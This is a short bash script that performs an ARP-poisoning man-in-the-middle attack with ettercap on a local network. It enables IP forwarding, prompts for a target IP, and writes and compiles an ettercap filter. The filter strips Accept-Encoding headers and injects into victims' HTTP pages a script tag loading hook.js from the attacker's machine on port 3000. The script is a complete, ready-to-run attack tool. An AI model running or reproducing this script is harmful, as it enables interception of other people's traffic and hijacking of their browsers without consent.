#!/bin/bash

echo 1 > /proc/sys/net/ipv4/ip_forward
ROUTE=$(route -n | grep Gate -A 1 | grep 0.0 | cut -d "." -f 4-7)
ROUTE=${ROUTE:1:-1}
LAN=$(echo $ROUTE | cut -d '.' -f 1-3)'.'
NIC=$(ifconfig | grep $LAN -B 1 | cut -d ' ' -f 1 | head -n 1)
MYIP=$(ifconfig | grep $LAN | cut -d ':' -f 2 | cut -d ' ' -f 1)
read -p " [*] Enter the IP of your target (Empty for all) $LAN" TARG
if [ $TARG -z ] 2> /dev/null
	then
		TARG=""
	else
		TARG=$LAN$TARG
fi

echo 'if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Hackers!"); 
      msg("Bypassed Accept-Encoding!\n");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   replace("</head>", "<script type="text/javascript" src="http://'"$MYIP"':3000/hook.js"> </script> </head>");
   msg("JavaScript Injected!.\n");
}' > etter.filter.jsinject

etterfilter -w etter.filter.jsinject -o jsinject.ef

sleep 1
ettercap -i $NIC -TqF jsinject.ef -M ARP /$TARG/ //
